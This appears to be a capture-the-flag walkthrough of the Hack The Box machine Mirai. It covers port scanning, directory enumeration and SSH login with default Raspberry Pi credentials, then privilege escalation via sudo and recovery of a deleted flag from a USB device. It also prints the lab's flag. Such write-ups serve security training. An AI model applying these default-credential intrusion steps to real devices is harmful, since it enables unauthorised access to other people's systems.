**Welcome** to this walkthrough for the [Hack The Box](https://www.hackthebox.com/) machine Mirai. This one is listed as an 'easy' box and has also been retired, so access is only provided to those that have purchased VIP access to HTB.
Because of this, you may notice that it is necessary to be connected to HTB's VIP VPN server, rather than the free server. To do this, change the dropdown selection in the top right corner where you select "Connect"
to "VIP" and download the .ovpn package (yes, even as a paid user, you must toggle between free and paid VPN packages depending on the machine).

## Scanning & Enumeration  

I went ahead and started my NMap scan and then plugged the IP address into the browser to check for HTTP and HTTPS respectfully: **10.10.10.48:80** & **10.10.10.48:443**  

Port 80 loaded a blank web page, so I initiated a directory scan and Nikto web-server/CGI scan as well.  

```bash
sudo nmap -sS -A -sV -T5 -p- 10.10.10.48 | tee nmap_full.txt
dirb http://10.10.10.48/ /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt | tee dirb.log
nikto -h "http://10.10.10.48/" | tee nikto.log 
```

### Port 80 - Pi-Hole  

As we see from our NMap scan results, 10.10.10.48:80 doesn't have a title and after inspecting the page, appears entirely blank.  

After navigating to 10.10.10.48/admin/ (and nearly a timeout attempting to do so), we find a login portal for Pi-hole.  

>Note: Tracking these requests via Burp, we see a Set-Cookie PHPSESSID response from /admin/ 

![Pi-Hole Login Portal](/assets/images/HTB/mirai/pi-hole.png)  

Additionally, we are able to grab some version numbers.  

With simple OSINT we find default credentials for a Pi-hole user (a Raspberry-Pi device) are:  

>pi:raspberry

But, as we can see by clicking *Forgot Password*, a password is uniquely generated each time the software is installed for a user.  

However, it gives us the console command to change that password :  

> sudo pihole -a -p  

Which then prompts you for a new password in the terminal.  

However, we do not currently have user access.  

I did some info. gathering on Pi-hole and learned a lot about it.  

Essentially, Pi-hole is a Raspberry-Pi based Linux application that serves as a network level ad-blocker via DNS.  

In one demonstration, I learned that Pi-hole can be accessed locally, via the web, or over **SSH**... an active service on this box.  

### Port 32400 - Plex Media Server  

When navigating to 10.10.10.48:32400, we are redirected to 10.10.10.48:32400/web/index.html which is a login page for Plex.  

![Plex Media Server Login](/assets/images/HTB/mirai/plex.png)  

Plex Media Server, developed by Plex, Inc., is used to organize and host audio, videos and photos in a client-server fashion which allows connected devices to stream media.  

I tried some default credentials here:  

> admin:admin  
> admin:password  
> root:root  
> root:toor  

But nothing went through, so I referred back to my Nikto scan.  

Trying to navigate to /webmail/ was not fruitful, and the tip on performing a BREACH attack was not helpful. Read more on BREACH attacks [here](https://resources.infosecinstitute.com/topic/the-breach-attack/).  

>Short answer: BREACH attacks require a victim to initiate them.  

Trying to visit other directories on this port most often loaded a blank XML file.  

## Initial Access via SSH  

Without overworking the web-enumeration (as this is an *easy* box), I decided to try the default Raspberry-Pi credentials over SSH.  

```bash
ssh pi@10.10.10.48

The authenticity of host '10.10.10.48 (10.10.10.48)' can't be established.
ED25519 key fingerprint is SHA256:TL7joF/Kz3rDLVFgQ1qkyXTnVQBTYrV44Y2oXyjOa60.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.48' (ED25519) to the list of known hosts.
pi@10.10.10.48's password: raspberry

SSH is enabled and the default password for the 'pi' user has not been changed.
This is a security risk - please login as the 'pi' user and type 'passwd' to set a new password.

pi@raspberrypi:~ $
```

Alright, so we have access to the user **pi** on the host **raspberrypi**.  

### User Flag

Navigate to ~/Desktop for the User Flag:  

```bash
cat ~/Desktop/user.txt
```  

## Privilege Escalation  

I escalated to **root** almost immediately by changing my current user to super-user :  

```bash
sudo su

root@raspberrypi: 
```

## Post-Exploit Enumeration - Root

Navigating to /root/ for the flag, we encounter a different puzzle :  

```bash
root@raspberrypi:/tmp# cat /root/root.txt
I lost my original root.txt! I think I may have a backup on my USB stick...
```  

### Locating USB  

So it appears we need to find the USB in order to get the flag. To detect it, run the following command :  

```bash
root@raspberrypi:/tmp# lsblk

NAME   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
sda      8:0    0   10G  0 disk 
├─sda1   8:1    0  1.3G  0 part /lib/live/mount/persistence/sda1
└─sda2   8:2    0  8.7G  0 part /lib/live/mount/persistence/sda2
sdb      8:16   0   10M  0 disk /media/usbstick
sr0     11:0    1 1024M  0 rom  
loop0    7:0    0  1.2G  1 loop /lib/live/mount/rootfs/filesystem.squashfs
```  

Alright, awesome. So we found the stick and it's already mounted to a directory for us (/media/usbstick).  

> Note: If it wasn't already mounted, we could easily do that by making a new directory and using the mount command : 
>> sudo mkdir /media/usb  
>> sudo mount /dev/sdb /media/usb  

### Exploring USB - Root Flag 

So, we have found the directory we need which has a text file in it :  

```bash
root@raspberrypi:/media/usbstick# ls

damnit.txt  lost+found
root@raspberrypi:/media/usbstick# cat damnit.txt
Damnit! Sorry man I accidentally deleted your files off the USB stick.
Do you know if there is any way to get them back?

Great, more hunting. Thanks, James.  

I tried many different types of enumeration before getting this final flag.  
Initially I tried looking for deleted files via inodes in /dev/sdb :  

```bash
root@raspberrypi:/media/usbstick# debugfs /dev/sdb
debugfs 1.42.12 (29-Aug-2014)
debugfs:  lsdel
```  

But this returned zero results (if it did hit, you can them retrieve the deleted files via: dump filename) :  

![Debugfs Deleted Inodes /sdb](/assets/images/HTB/mirai/debugfs)  

I also hosted a bundle of [TestDisk + PhotoRec](https://www.cgsecurity.org/wiki/TestDisk) for Linux and downloaded it but couldn't get it to fire off right.  

Putting my CTF cap on, I started running commands to identify more information about the file: file, strings, etc.  

Until I reached a breakthrough, running the **strings** command on the disk itself :  

```
root@raspberrypi:/media/usbstick# strings /dev/sdb

>r &
/media/usbstick
lost+found
root.txt
damnit.txt
>r &
>r &
/media/usbstick
lost+found
root.txt
damnit.txt
>r &
/media/usbstick
2]8^
lost+found
root.txt
damnit.txt
>r &
3d3e483143ff12ec505d026fa13e020b
Damnit! Sorry man I accidentally deleted your files off the USB stick.
Do you know if there is any way to get them back?
-James
```  

And there you have it, the root.txt flag!
